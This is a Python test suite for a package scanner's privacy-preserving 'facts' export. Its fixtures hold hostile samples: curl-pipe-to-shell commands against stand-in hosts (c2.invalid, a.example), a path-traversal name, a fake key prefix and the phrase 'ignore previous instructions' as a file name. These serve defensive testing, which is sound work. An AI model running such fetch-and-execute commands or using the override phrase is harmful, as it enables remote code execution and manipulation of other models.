"""The facts export (`facts/v1`, learning loop row LL-1): facts and counts about a package, and no text from it."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.contracts.digests import ArtifactDigests
from cordon_scanner.engine.registry import Registry
from cordon_scanner.foundation.capabilities import Capability
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Hook, Location
from cordon_scanner.foundation.results import Dependency, Repository, ScanResult
from cordon_scanner.report.base import ReportOptions
from cordon_scanner.report.facts import FACTS_VERSION, ScanFacts
from support import BENIGN, ROOT, Support, requires_corpus

#: Text the package wrote, which must never reach the record: its paths and file names, a message, a host.
PACKAGE_TEXT = (
    "lib/helper-spawn.js",
    "helper-spawn",
    "dist/index.js",
    "install.js",
    "telemetry.example",
)


class FactsKit:
    @staticmethod
    def result(**overrides: object) -> ScanResult:
        findings = (
            Support.a_finding(
                rule_id="CAP.JS.SPAWN.001",
                location=Location(path="lib/helper-spawn.js", line=3),
                capabilities=(Capability.SPAWN,),
                message="spawns a process at telemetry.example",
            ),
            Support.a_finding(
                rule_id="CAP.JS.EGRESS.001",
                location=Location(path="lib/helper-spawn.js", line=9),
                capabilities=(Capability.EGRESS,),
            ),
            Support.a_finding(
                rule_id="CAP.JS.EGRESS.001",
                location=Location(path="dist/index.js", line=1),
                capabilities=(Capability.EGRESS,),
            ),
            Support.a_finding(
                rule_id="POLICY.PACKAGE.EXAMPLE.001", location=Location(path=".", line=None)
            ),
        )
        fields: dict[str, object] = {
            "findings": findings,
            "repository": Repository(
                root="/tmp/pkg",
                hooks=(
                    Hook(
                        kind="postinstall",
                        path="package.json",
                        name="postinstall",
                        command="node ./install.js --quiet && /usr/bin/env echo done",
                    ),
                ),
                file_count=4,
            ),
            "dependencies": (
                Dependency(
                    purl="pkg:npm/left-pad@1.3.0",
                    ecosystem="npm",
                    name="left-pad",
                    version="1.3.0",
                    direct=True,
                ),
            ),
            "places": {"install_entry": ("install.js",), "import_entry": ("dist/index.js",)},
            "target_kind": "package",
            "engine_version": "0.8.0",
        }
        fields.update(overrides)
        return ScanResult(**fields)  # type: ignore[arg-type]


class TestTheRecordHoldsFactsAndNoText:
    def test_no_path_name_message_or_host_of_the_package_reaches_the_record(self) -> None:
        text = json.dumps(ScanFacts.of(FactsKit.result()))
        for written in PACKAGE_TEXT:
            assert written not in text, written

    def test_a_capability_file_no_place_reaches_is_counted_as_unreached(self) -> None:
        record = ScanFacts.of(FactsKit.result())
        spawn = next(
            f for f in record["files"] if f["key"] == ScanFacts.file_key("lib/helper-spawn.js")
        )
        assert spawn["reached"] is False and spawn["places"] == []
        assert spawn["capabilities"] == sorted([str(Capability.SPAWN), str(Capability.EGRESS)])
        assert spawn["rules"] == {"CAP.JS.EGRESS.001": 1, "CAP.JS.SPAWN.001": 1}
        assert record["package"]["unreached_capability_files"] == 1

    def test_a_file_in_a_place_carries_the_place_and_is_reached(self) -> None:
        record = ScanFacts.of(FactsKit.result())
        entry = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("dist/index.js"))
        assert (
            entry["places"] == ["import_entry"]
            and entry["reached"] is True
            and entry["ext"] == "js"
        )
        # A file with a place and nothing else is counted by place, not listed.
        assert ScanFacts.file_key("install.js") not in {f["key"] for f in record["files"]}
        assert record["package"]["places"]["install_entry"] == 1

    def test_package_level_facts(self) -> None:
        package = ScanFacts.of(FactsKit.result())["package"]
        assert package["places"] == {"import_entry": 1, "install_entry": 1}
        assert package["hooks"] == [{"kind": "postinstall", "programs": ["node", "OTHER"]}]
        assert package["dependencies"] == {"total": 1, "direct": 1, "local": 0}
        assert package["rules"] == {"POLICY.PACKAGE.EXAMPLE.001": 1}

    def test_a_suppression_does_not_change_the_facts_and_is_counted_apart(self) -> None:
        from cordon_scanner.foundation.models import Suppression

        plain = Support.a_finding(
            rule_id="CAP.JS.EGRESS.001", location=Location(path="lib/other.js", line=1)
        )
        hidden = plain.with_suppression(
            Suppression(
                rule="CAP.JS.EGRESS.001",
                path="lib/other.js",
                justification="example",
                expires="2099-01-01",
            )
        )
        shown = ScanFacts.of(FactsKit.result(findings=(plain,)))
        kept = ScanFacts.of(FactsKit.result(findings=(hidden,)))
        assert [f["rules"] for f in shown["files"]] == [f["rules"] for f in kept["files"]]
        assert kept["files"][0]["suppressed"] == {"CAP.JS.EGRESS.001": 1}
        assert shown["files"][0]["suppressed"] == {}

    def test_an_unread_file_says_so_and_is_never_absent(self) -> None:
        record = ScanFacts.of(
            FactsKit.result(content_gaps=(("OPERATIONAL.FILE.TRUNCATED", "dist/big.js"),))
        )
        big = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("dist/big.js"))
        assert big["unread"] == ["OPERATIONAL.FILE.TRUNCATED"]
        assert record["package"]["files_unread"] == 1

    def test_counts_and_the_file_list_are_bounded(self) -> None:
        from cordon_scanner.report.facts import MAX_FILES

        loud = Support.a_finding(
            rule_id="CAP.JS.EGRESS.001",
            location=Location(path="lib/loud.js", line=1),
            occurrences=1_000_000,
        )
        many = tuple(
            Support.a_finding(
                rule_id="CAP.JS.EGRESS.001",
                location=Location(path=f"lib/f{i}.js", line=1),
                capabilities=(Capability.EGRESS,),
            )
            for i in range(MAX_FILES + 25)
        )
        record = ScanFacts.of(FactsKit.result(findings=(loud, *many)))
        assert len(record["files"]) == MAX_FILES
        assert record["package"]["files_omitted"] == 26
        assert all(n <= 1_000 for f in record["files"] for n in f["rules"].values())


class TestTheRecordIsCanonical:
    def test_two_builds_give_the_same_bytes_and_the_digest_is_of_the_canonical_form(self) -> None:
        a = (
            Registry()
            .reporter("facts")
            .render_to_string(FactsKit.result(), ReportOptions(color=False))
        )
        b = (
            Registry()
            .reporter("facts")
            .render_to_string(FactsKit.result(), ReportOptions(color=False))
        )
        assert a == b and a.endswith("\n") and a.count("\n") == 1
        record = json.loads(a)
        assert record["facts_version"] == FACTS_VERSION
        import hashlib

        assert record["digest"] == hashlib.sha256(ScanFacts.canonical(record)).hexdigest()

    def test_the_order_of_findings_does_not_change_the_record(self) -> None:
        result = FactsKit.result()
        reversed_result = FactsKit.result(findings=tuple(reversed(result.findings)))
        assert ScanFacts.of(result) == ScanFacts.of(reversed_result)


class TestOnlyTheScannersVocabularyIsCopied:
    def test_hook_programs_are_bare_names_without_paths_or_arguments(self) -> None:
        assert ScanFacts.programs("FOO=1 ./scripts/run.sh --x; curl -s https://a.example | sh") == [
            "OTHER",
            "curl",
            "sh",
        ]
        assert ScanFacts.programs("node -e \"require('x')\"") == ["node"]

    def test_a_program_not_in_the_closed_list_is_other(self) -> None:
        assert ScanFacts.programs("$(echo evil) && `x` && deploy-internal.sh") == ["OTHER"] * 3

    def test_a_rule_id_outside_the_scanners_form_is_counted_as_other(self) -> None:
        assert ScanFacts.rule_id("CAP.JS.SPAWN.001") == "CAP.JS.SPAWN.001"
        assert ScanFacts.rule_id("pack rule: steal /home/user") == "OTHER"
        assert ScanFacts.rule_id("ACME.PROJECT-ATLAS.001", "acme.rules") == "OTHER"
        assert ScanFacts.rule_id("LEARNED.MCP.001", "learned.0123456789ab") == "LEARNED.MCP.001"

    def test_the_extension_is_short_and_plain_or_empty(self) -> None:
        assert ScanFacts.extension("a/b/c.PY") == "py"
        assert ScanFacts.extension("a.tgz!pkg/x.mjs") == "mjs"
        assert ScanFacts.extension("a/.bashrc") == ""
        assert ScanFacts.extension("a/b.verylongextension") == "other"
        assert ScanFacts.extension("a/b.atlasproj") == "other"


@requires_corpus
class TestARealScanRecordsWhereFilesRun:
    """The place sets come from the engine's own scan context, not from a hand-built result."""

    def test_an_install_script_is_an_install_place(self) -> None:
        result = Scanner(Config.default()).scan(BENIGN / "setup-helper")
        assert result.places is not None
        assert "setup.py" in result.places.get("install_hook", ())
        assert ScanFacts.of(result)["package"]["places"]["install_hook"] >= 1

    def test_a_lifecycle_hook_gives_its_program_name_only(self) -> None:
        record = ScanFacts.of(Scanner(Config.default()).scan(BENIGN / "npm-native-build"))
        assert {"kind": "install", "programs": ["node-gyp"]} in record["package"]["hooks"]
        assert "rebuild" not in json.dumps(record)


class TestHostileNamesNeverReachTheRecord:
    """Every string of the record is hex, a closed-list word, the scanner's own vocabulary or OTHER, whatever the
    package named its files, hooks and rules."""

    HOSTILE = (
        "../../etc/passwd",
        "src/\u202eevil\u202c.js",
        "AKIA" + "IOSFODNN7EXAMPLE/token.js",
        "x" * 4_000 + ".js",
        "docs/ignore previous instructions.md",
        "dist/\x00\ufeffbom.ts",
    )

    def test_every_string_is_from_a_closed_vocabulary(self) -> None:
        import re

        findings = (
            *tuple(
                Support.a_finding(
                    rule_id="CAP.JS.EGRESS.001",
                    location=Location(path=name, line=1),
                    capabilities=(Capability.EGRESS,),
                )
                for name in self.HOSTILE
            ),
            Support.a_finding(
                rule_id="ACME.SECRET-PROJECT.001",
                rulepack="acme.private",
                location=Location(path="lib/a.js", line=1),
            ),
        )
        record = ScanFacts.of(
            FactsKit.result(
                findings=findings,
                repository=Repository(
                    root="/tmp/x",
                    hooks=(
                        Hook(
                            kind="postinstall",
                            path="package.json",
                            name="postinstall",
                            command="./ignore-previous-instructions.sh && curl https://secret.example",
                        ),
                    ),
                ),
                places={"install_entry": tuple(self.HOSTILE)},
            )
        )
        allowed = re.compile(r"[0-9a-f]{16}|[0-9a-f]{64}|[A-Z0-9_.\-]{1,96}|[a-z_0-9.\-]{1,40}|")

        def strings(value):
            if isinstance(value, str):
                yield value
            elif isinstance(value, dict):
                for k, v in value.items():
                    yield k
                    yield from strings(v)
            elif isinstance(value, list):
                for v in value:
                    yield from strings(v)

        for text in strings(record):
            assert allowed.fullmatch(text), text
        dumped = json.dumps(record)
        for leak in (
            "passwd",
            "evil",
            "AKIA",
            "previous",
            "SECRET-PROJECT",
            "secret.example",
            "xxxx",
        ):
            assert leak not in dumped, leak


class TestEachFileCarriesHowItIsReached:
    """`facts_version` 2: `reach` and `reach_depth` per file (`decide/reach.py`), from a closed list, and the counts by kind under `package.reach`."""

    def test_the_record_carries_the_reach_of_a_file_and_no_name(self) -> None:
        reach = {
            "lib/helper-spawn.js": ("unreached", 0),
            "dist/index.js": ("placed", 0),
            "install.js": ("hook_command", 0),
        }
        record = ScanFacts.of(FactsKit.result(reach=reach))
        by_key = {f["key"]: f for f in record["files"]}
        assert by_key[ScanFacts.file_key("lib/helper-spawn.js")]["reach"] == "unreached"
        assert by_key[ScanFacts.file_key("dist/index.js")]["reach"] == "placed"
        assert record["package"]["reach"] == {"hook_command": 1, "placed": 1, "unreached": 1}
        for text in PACKAGE_TEXT:
            assert text not in json.dumps(record)

    def test_a_file_of_another_kind_is_not_code(self) -> None:
        record = ScanFacts.of(FactsKit.result())
        assert {f["reach"] for f in record["files"]} == {"not_code"}
        assert {f["reach_depth"] for f in record["files"]} == {0}

    def test_a_reach_outside_the_closed_list_is_other_and_the_depth_is_bounded(self) -> None:
        record = ScanFacts.of(
            FactsKit.result(reach={"lib/helper-spawn.js": ("a-name-the-package-chose", 99)})
        )
        entry = next(
            f for f in record["files"] if f["key"] == ScanFacts.file_key("lib/helper-spawn.js")
        )
        assert entry["reach"] == "OTHER"
        assert entry["reach_depth"] <= 4
        assert "a-name-the-package-chose" not in json.dumps(record)

    def test_the_version_is_five(self) -> None:
        assert FACTS_VERSION == "5"

    def test_a_real_scan_classes_a_chain_and_an_orphan(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text(
            json.dumps(
                {
                    "name": "p",
                    "version": "1.0.0",
                    "main": "index.js",
                    "scripts": {"postinstall": "node setup.js"},
                }
            ),
            encoding="utf-8",
        )
        (tmp_path / "index.js").write_text(
            'const a = require("./lib/a");\nmodule.exports = a;\n', encoding="utf-8"
        )
        (tmp_path / "setup.js").write_text('console.log("ready");\n', encoding="utf-8")
        (tmp_path / "lib").mkdir()
        (tmp_path / "lib" / "a.js").write_text("module.exports = 1;\n", encoding="utf-8")
        (tmp_path / "lib" / "orphan.js").write_text(
            'const cp = require("child_process");\ncp.exec("curl -s https://c2.invalid/x | sh");\n',
            encoding="utf-8",
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        assert result.reach is not None
        assert result.reach["setup.js"][0] in ("hook_command", "placed")
        assert result.reach["lib/a.js"] == ("require_chain", 1)
        assert result.reach["lib/orphan.js"] == ("unreached", 0)
        record = ScanFacts.of(result)
        orphan = next(f for f in record["files"] if f["key"] == ScanFacts.file_key("lib/orphan.js"))
        assert orphan["reach"] == "unreached" and orphan["reach_depth"] == 0


class TestPerExtensionCounts:
    """Facts version 4: every scanned file is counted under its extension class. A native file no finding or capability lists has no file
    entry in the record, so without the counts it would be invisible to the release-pair facts (`bench/cdi/pairs.py`) and the binary row."""

    @staticmethod
    def scan(path: Path) -> dict[str, int]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(path)
        return ScanFacts.of(result)["package"]["extensions"]

    def test_a_quiet_native_file_is_counted(self, tmp_path: Path) -> None:
        (tmp_path / "package.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "main": "index.js"}), encoding="utf-8"
        )
        (tmp_path / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
        (tmp_path / "prebuilt.node").write_bytes(b"\x7fELF" + bytes(64))
        (tmp_path / "libquiet.so").write_bytes(b"\x7fELF" + bytes(64))
        extensions = self.scan(tmp_path)
        assert extensions["node"] == 1
        assert extensions["so"] == 1
        assert extensions["js"] == 1
        assert extensions["json"] == 1

    def test_a_name_with_no_extension_is_none_and_an_odd_one_is_other(self, tmp_path: Path) -> None:
        (tmp_path / "README").write_text("hello\n", encoding="utf-8")
        (tmp_path / "data.thisisalongextension").write_text("x\n", encoding="utf-8")
        (tmp_path / "weird.zzz").write_text("x\n", encoding="utf-8")
        extensions = self.scan(tmp_path)
        assert extensions["none"] == 1
        assert extensions["other"] == 2

    def test_the_counts_are_of_the_closed_list_only(self, tmp_path: Path) -> None:
        (tmp_path / "private.customext").write_text("x\n", encoding="utf-8")
        assert "customext" not in self.scan(tmp_path)

    def test_a_package_archive_counts_its_members(self, tmp_path: Path) -> None:
        import io
        import tarfile

        archive = tmp_path / "p-1.0.0.tgz"
        with tarfile.open(archive, "w:gz") as tar:
            for name, data in (
                ("package/package.json", b'{"name":"p","version":"1.0.0"}'),
                ("package/index.js", b"module.exports = 1;\n"),
                ("package/build/addon.node", b"\x7fELF" + bytes(64)),
            ):
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        extensions = self.scan(archive)
        assert extensions["node"] == 1
        assert extensions["js"] == 1

    def test_the_record_class_of_a_raw_count(self) -> None:
        assert ScanFacts.extension_counts({"": 2, "js": 3, "zzz": 1, "other": 2, "node": 1}) == {
            "js": 3,
            "node": 1,
            "none": 2,
            "other": 3,
        }

    def test_a_hostile_package_cannot_make_the_counts_unbounded(self) -> None:
        from cordon_scanner.engine.pipeline.accumulator import Accumulator

        acc = Accumulator()
        for i in range(2_000):
            acc.scanned(f"pkg/f.e{i}")
        assert len(acc.extensions) <= Accumulator.MAX_EXTENSIONS + 1
        assert acc.files_scanned == 2_000
        assert sum(acc.extensions.values()) == 2_000

    def test_the_extension_of_a_path_is_read_one_way_by_the_scan_and_the_record(self) -> None:
        from cordon_scanner.foundation.files.extension import FileExtension

        for path in (
            "a/b.JS",
            "x.tar.gz",
            ".env",
            "Makefile",
            "p.tgz!package/z.node",
            "a/b.verylongext",
        ):
            raw = FileExtension.of(path)
            assert ScanFacts.extension(path) == (
                raw if not raw or raw in {"js", "gz", "node"} else "other"
            )


class TestFactsVersionFiveBinariesAndToolList:
    """Version 5 adds the native files a scan read, by digest, and the tools a package declares whole as data, by count and
    digest. Everything version 4 carried keeps its value."""

    GOLDEN = ROOT / "tests" / "unit" / "contracts" / "tool_list_digests.golden.json"
    NEW = ("binaries", "binaries_truncated", "tool_list")

    @staticmethod
    def scan(path: Path) -> dict:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(path)
        return ScanFacts.of(result)["package"]

    @staticmethod
    def package(path: Path, **files: bytes) -> Path:
        (path / "package.json").write_text(
            json.dumps({"name": "p", "version": "1.0.0", "main": "index.js"}), encoding="utf-8"
        )
        (path / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
        for name, content in files.items():
            (path / name.replace("__", ".")).write_bytes(content)
        return path

    def test_a_real_scan_lists_the_digest_of_each_native_file_and_no_other(
        self, tmp_path: Path
    ) -> None:
        elf, macho = b"\x7fELF" + bytes(64), b"\xcf\xfa\xed\xfe" + bytes(32)
        self.package(
            tmp_path, prebuilt__node=elf, libquiet__so=macho, notes__txt=b"ELF is only a word here"
        )
        package = self.scan(tmp_path)
        assert package["binaries"] == sorted(hashlib.sha256(b).hexdigest() for b in (elf, macho))
        assert package["binaries_truncated"] is False

    def test_a_windows_executable_is_native_only_when_its_name_says_so(
        self, tmp_path: Path
    ) -> None:
        pe = b"MZ" + bytes(64)
        self.package(tmp_path, tool__exe=pe, readme__txt=pe)
        assert self.scan(tmp_path)["binaries"] == [hashlib.sha256(pe).hexdigest()]

    def test_a_package_with_no_native_file_reports_an_empty_list_not_a_missing_one(
        self, tmp_path: Path
    ) -> None:
        package = self.scan(self.package(tmp_path))
        assert package["binaries"] == [] and package["binaries_truncated"] is False

    def test_the_same_file_twice_is_one_digest(self, tmp_path: Path) -> None:
        elf = b"\x7fELF" + bytes(64)
        self.package(tmp_path, a__so=elf, b__so=elf)
        assert self.scan(tmp_path)["binaries"] == [hashlib.sha256(elf).hexdigest()]

    def test_the_list_is_capped_and_says_it_was(self) -> None:
        digests = tuple(f"{i:064x}" for i in range(300))
        package = ScanFacts.of(FactsKit.result(binaries=digests))["package"]
        assert package["binaries"] == list(digests[:256])
        assert package["binaries_truncated"] is True

    def test_a_file_that_could_not_be_hashed_whole_makes_the_list_a_part(self) -> None:
        package = ScanFacts.of(FactsKit.result(binaries=("ab" * 32,), binaries_complete=False))[
            "package"
        ]
        assert package["binaries"] == ["ab" * 32] and package["binaries_truncated"] is True

    def test_a_scan_that_did_not_collect_them_says_nothing(self) -> None:
        package = ScanFacts.of(FactsKit.result())["package"]
        assert package["binaries"] is None and package["binaries_truncated"] is False

    def test_the_tool_list_digest_is_the_one_in_the_shared_vectors(self) -> None:
        vectors = {
            v["name"]: v for v in json.loads(self.GOLDEN.read_text(encoding="utf-8"))["vectors"]
        }
        vector = vectors["two tools"]
        package = ScanFacts.of(FactsKit.result(tool_list=tuple(vector["tools"])))["package"]
        assert package["tool_list"] == {"count": len(vector["tools"]), "digest": vector["digest"]}

    def test_the_record_carries_the_count_and_digest_never_a_tools_text(self) -> None:
        tools = (
            {
                "name": "wipe-everything",
                "description": "Deletes it all",
                "inputSchema": {"type": "object"},
            },
        )
        text = json.dumps(ScanFacts.of(FactsKit.result(tool_list=tools)))
        assert "wipe-everything" not in text and "Deletes it all" not in text

    def test_a_manifest_that_declares_whole_tools_gives_their_digest(self, tmp_path: Path) -> None:
        tools = [
            {"name": "search", "description": "Find things", "inputSchema": {"type": "object"}},
            {"name": "read", "description": "Read one", "inputSchema": {"type": "object"}},
        ]
        self.package(tmp_path)
        (tmp_path / "manifest.json").write_text(json.dumps({"tools": tools}), encoding="utf-8")
        listed = self.scan(tmp_path)["tool_list"]
        assert listed == {"count": 2, "digest": ArtifactDigests.of_tool_list(tools)}

    def test_a_list_that_leaves_out_a_schema_a_description_or_a_name_is_not_a_tool_list(
        self, tmp_path: Path
    ) -> None:
        for partial in (
            {"name": "a", "description": "d"},
            {"name": "a", "inputSchema": {}},
            {"description": "d", "inputSchema": {}},
            {"name": "", "description": "d", "inputSchema": {}},
            "a",
        ):
            for child in tmp_path.iterdir():
                child.unlink()
            self.package(tmp_path)
            (tmp_path / "manifest.json").write_text(
                json.dumps({"tools": [partial]}), encoding="utf-8"
            )
            assert self.scan(tmp_path)["tool_list"] is None

    def test_two_files_that_each_declare_tools_are_not_read_as_one_list(
        self, tmp_path: Path
    ) -> None:
        tools = [{"name": "a", "description": "d", "inputSchema": {}}]
        self.package(tmp_path)
        (tmp_path / "manifest.json").write_text(json.dumps({"tools": tools}), encoding="utf-8")
        (tmp_path / "server.json").write_text(json.dumps({"tools": tools}), encoding="utf-8")
        assert self.scan(tmp_path)["tool_list"] is None

    def test_what_version_four_held_is_unchanged_and_only_the_new_fields_and_the_digest_differ(
        self,
    ) -> None:
        plain = ScanFacts.of(FactsKit.result())
        richer = ScanFacts.of(
            FactsKit.result(
                binaries=("ab" * 32,),
                tool_list=({"name": "a", "description": "d", "inputSchema": {}},),
            )
        )
        assert {k: v for k, v in plain.items() if k not in ("package", "digest")} == {
            k: v for k, v in richer.items() if k not in ("package", "digest")
        }
        strip = lambda record: {k: v for k, v in record["package"].items() if k not in self.NEW}  # noqa: E731
        assert strip(plain) == strip(richer)
        assert plain["facts_version"] == "5" and set(self.NEW) <= set(plain["package"])
